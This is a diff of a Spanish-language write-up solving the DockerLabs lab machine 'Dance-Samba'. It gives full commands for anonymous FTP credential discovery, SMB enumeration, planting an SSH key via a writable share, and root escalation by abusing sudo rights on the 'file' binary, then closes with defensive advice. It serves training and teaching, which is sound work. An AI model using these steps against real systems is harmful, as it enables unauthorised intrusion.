@@ -1,82 +1,315 @@
-# DANCE SAMBA — DockerLabs
+# Dance-Samba — DockerLabs
 
 **Plataforma:** DockerLabs  
-**Dificultad:** 🟠 Media  
+**Dificultad:** 🟡 Medio  
 **SO:** Linux  
+**Autor de la máquina:** d1se0  
+**Fecha de creación:** 26/08/2024  
+**Técnicas:** FTP Anonymous · SMB Enumeration · SSH Key Injection · Samba · GTFOBins · sudo file abuse
 
 ---
 
-## Resumen
+## Índice
 
-Resolución de la máquina **DANCE SAMBA** de DockerLabs.
+1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
+2. [Enumeración FTP](#2-enumeración-ftp)
+3. [Enumeración SMB](#3-enumeración-smb)
+4. [Acceso SSH mediante clave RSA](#4-acceso-ssh-mediante-clave-rsa)
+5. [Escalada de privilegios](#5-escalada-de-privilegios)
+6. [Lección aprendida](#6-lección-aprendida)
 
 ---
 
-## 1. Reconocimiento
+## 1. Despliegue y reconocimiento
 
-Vamos a desplegar la maquina vulnerable.
+Desplegamos la máquina vulnerable:
 
-Haremos un escaneo profundo de los puertos abiertos de esta máquina.
+```bash
+sudo bash auto_deploy.sh dance-samba.tar
+```
 
-Vemos que cuenta con varios servicios abiertos, lo primero que haremos será ver
-el .txt que nos indica el escaneo.
-Vemos una posible contraseña de un usuario.
+> IP asignada: `172.17.0.2`
 
-Ahora vamos a hacer una enumeración del servicio smb
+Realizamos un escaneo profundo:
 
-## 2. Enumeración
+```bash
+sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
+```
 
-Nos encontramos con varias pistas, los servicios compartidos y un usuario,
-macarena
+Resultado:
 
-Ahora hacemos una enumeración para ver que permisos tiene esta usuaria en la
-carpeta. Vemos que puede leer y escribir.
+```text
+21/tcp open ftp
+22/tcp open ssh
+139/tcp open netbios-ssn
+445/tcp open microsoft-ds
+```
 
-Listamos y vemos que tiene un .txt así que lo pasaremos a nuestro host y lo
-miraremos
+Servicios detectados:
 
-Es la flag del usuario.
+```text
+FTP Anonymous enabled
+Samba
+OpenSSH
+```
 
-## 3. Explotación
+---
 
-Ya que tenemos permisos para escribir, vamos añadirle una clave rsa para poder
-conectarnos por ssh. Así que crearemos primero el directorio con mkdir.
+## 2. Enumeración FTP
 
-Ahora desde nuestro host vamos a generar una clave ssh
+Accedemos al servicio FTP de forma anónima:
 
-Una vez lo tengamos, vamos a dirigirnos en donde nos la genero y la copiaremos
-en el directorio donde estamos trabajando, para mas comodidad.
+```bash
+ftp 172.17.0.2
+```
 
-Vamos a leer la clave publica y la vamos a copiar con el nombre authorized_heys
+Usuario:
 
-## 4. Post-explotación
+```text
+anonymous
+```
 
-Ahora vuelta al servicio smb, vamos a subir los dos archivos que hemos hecho
+Listamos el contenido:
 
-Al listar, se debería de ver así.
+```bash
+ls
+```
 
-Ahora tendríamos que poder ingresar con la clave privada que tenemos.
+Encontramos:
 
-Explorando un poco encontramos un cifrado.
+```text
+nota.txt
+```
+
+Descargamos el archivo:
+
+```bash
+get nota.txt
+```
+
+Leemos el contenido:
+
+```bash
+cat nota.txt
+```
+
+Resultado:
+
+```text
+I don't know what to do with Macarena, she's obsessed with donald.
+```
+
+Obtenemos posibles credenciales:
+
+```text
+Usuario: macarena
+Contraseña: donald
+```
+
+---
+
+## 3. Enumeración SMB
+
+Realizamos enumeración SMB:
+
+```bash
+enum4linux -a 172.17.0.2
+```
+
+Resultado:
+
+```text
+Usuario encontrado: macarena
+Recursos compartidos SMB
+```
+
+Enumeramos permisos:
+
+```bash
+smbmap -H 172.17.0.2 -u macarena -p donald
+```
+
+Resultado:
+
+```text
+macarena  READ, WRITE
+```
+
+Accedemos al recurso compartido:
+
+```bash
+smbclient //172.17.0.2/macarena -U macarena
+```
+
+Listamos archivos:
+
+```bash
+ls
+```
+
+Encontramos:
+
+```text
+user.txt
+```
+
+Descargamos el archivo:
+
+```bash
+get user.txt
+```
+
+La compartición tiene permisos de escritura, por lo que aprovecharemos esto para añadir una clave SSH.
+
+Creamos el directorio `.ssh`:
+
+```bash
+mkdir .ssh
+cd .ssh
+```
+
+Generamos una clave RSA en nuestro host:
+
+```bash
+ssh-keygen -t rsa -b 2048
+```
+
+Copiamos la clave pública:
+
+```bash
+cat id_rsa.pub > authorized_keys
+```
+
+Subimos los archivos mediante SMB:
+
+```bash
+put id_rsa.pub
+put authorized_keys
+```
+
+---
+
+## 4. Acceso SSH mediante clave RSA
+
+Accedemos utilizando nuestra clave privada:
+
+```bash
+ssh -i id_rsa macarena@172.17.0.2
+```
+
+Acceso correcto.
+
+Explorando el sistema encontramos un directorio:
+
+```bash
+cd /home/secret
+```
+
+Dentro encontramos:
+
+```text
+hash
+```
+
+Leemos el contenido:
+
+```bash
+cat hash
+```
+
+El valor corresponde a una contraseña cifrada.
+
+Utilizamos CyberChef para decodificarla.
+
+Herramienta utilizada:
+
+[CyberChef](https://gchq.github.io/CyberChef/?utm_source=chatgpt.com)
+
+Resultado:
+
+```text
+supercontraseña
+```
+
+---
 
 ## 5. Escalada de privilegios
 
-Si lo vemos nos da una contraseña.
+Comprobamos privilegios sudo:
 
-Vemos que es la contraseña de macarena, así que ejecutamos sudo -l para ver si
-permisos de sudo en algun binario, vemos que en file.
+```bash
+sudo -l
+```
 
-Explorando un poco más encontramos un txt donde solo tiene permisos sudo.
+Resultado:
 
-Con ayuda de gtfobins, vemos como podemos aprovechar este binario.
+```text
+(ALL : ALL) /usr/bin/file
+```
 
-## 6. Lección aprendida
+Explorando el sistema encontramos:
 
-Esta máquina enseña a encadenar técnicas de reconocimiento, enumeración y explotación para comprometer un sistema Linux y escalar hasta root.
+```text
+/opt/password.txt
+```
 
-> 💡 **Consejo para principiantes:** Si te atascas, vuelve al paso de enumeración — casi siempre hay algo que no viste la primera vez.
+Consultamos GTFOBins para el binario `file`.
+
+Payload utilizado:
+
+```bash
+LFILE=/opt/password.txt
+sudo file -f $LFILE
+```
+
+Resultado:
+
+```text
+root:rooteable2
+```
+
+Cambiamos al usuario root:
+
+```bash
+su root
+```
+
+Contraseña:
+
+```text
+rooteable2
+```
+
+Verificamos privilegios:
+
+```bash
+whoami
+root
+```
+
+✅ Somos **root**.
 
 ---
 
-*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs*  
-*¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
+## 6. Lección aprendida
+
+| Vulnerabilidad | Impacto |
+|----------------|---------|
+| FTP Anonymous habilitado | Filtración de información |
+| Contraseña débil SMB | Acceso inicial |
+| Compartición SMB escribible | Persistencia mediante SSH |
+| Información sensible almacenada localmente | Descubrimiento de credenciales |
+| sudo sobre file | Lectura de archivos privilegiados |
+
+**Para defenderse:**
+
+- Deshabilitar acceso FTP anónimo.
+- Restringir permisos de escritura en recursos SMB.
+- Utilizar contraseñas robustas.
+- No almacenar secretos accesibles localmente.
+- Limitar binarios peligrosos ejecutables mediante sudo.
+
+---
+
+*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
+*¿Te ha ayudado? Dale una ⭐ al repositorio.*
